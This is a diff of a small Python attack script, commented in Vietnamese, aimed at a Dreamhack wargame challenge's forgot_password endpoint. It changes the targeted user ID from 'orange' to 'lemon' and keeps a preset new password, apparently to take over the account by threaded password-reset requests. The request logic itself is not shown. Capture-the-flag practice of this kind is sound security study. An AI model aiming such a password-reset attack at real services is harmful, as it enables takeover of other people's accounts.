@@ -5,7 +5,7 @@ import threading
 target_url = "http://host1.dreamhack.games:15094/forgot_password"
 
 # Tên người dùng muốn tấn công
-target_userid = "orange"
+target_userid = "lemon"
 
 # Mật khẩu mới muốn đặt
 new_password = "123"
@@ -39,3 +39,4 @@ for t in threads:
     t.join()
 
 print("Đã gửi xong tất cả yêu cầu.")
+
